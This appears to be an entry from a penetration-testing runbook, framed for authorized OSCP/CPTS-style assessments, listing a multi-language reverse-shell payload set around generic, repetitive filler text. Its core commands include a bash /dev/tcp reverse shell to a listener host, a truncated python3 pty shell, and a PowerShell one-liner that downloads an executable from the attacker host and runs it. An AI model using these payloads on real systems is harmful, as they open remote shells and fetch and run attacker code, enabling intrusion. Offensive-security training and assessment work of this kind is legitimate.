title: Reverse Shell Multi-Language Payload Set
description: This runbook operationalizes Reverse Shell Multi-Language Payload Set using #bash , #python3 , #powershell . It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments. Provides fallback reverse-shell execution across Linux and Windows footholds.

metadata.descriptionHtml:
This runbook operationalizes Reverse Shell Multi-Language Payload Set using #bash , #python3 , #powershell. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.

Provides fallback reverse-shell execution across Linux and Windows footholds.

  1. Prepare scope and access: validate target reachability and select low-noise execution order.
  2. Execute core workflow: run the command chain to produce actionable security outcomes.
  3. Validate and operationalize output: confirm results, capture artifacts, and prepare follow-on actions.
  • Tool Location/Source: primary references are in local source corpus entries linked from runbook-list.md; e.g., docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:474; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:487.
  • Attack pre-requisite: authorized scope, operator shell access, and protocol reachability on TCP 80, TCP 443.
  • What attacker gain: validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.
  • Detection/Defense opsec: monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.

Core Commands:

/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
python3 -c 'import socket,subprocess,os,pty; ...; pty.spawn("/bin/bash")'
powershell -c "Invoke-WebRequest -Uri http://<LHOST>/rs.exe -OutFile C:\\windows\\temp\\rs.exe; Start-Process C:\\windows\\temp\\rs.exe"
metadata.commandsBlock:

steps.tooltip: Early validation reduces noise and prevents invalid follow-on actions against unreachable or mismatched targets.

steps.name: Primary Execution
steps.description: Main command path executes against the target service or domain component.
steps.tooltip: The technique leverages service behavior, protocol assumptions, or misconfiguration to extract actionable state.
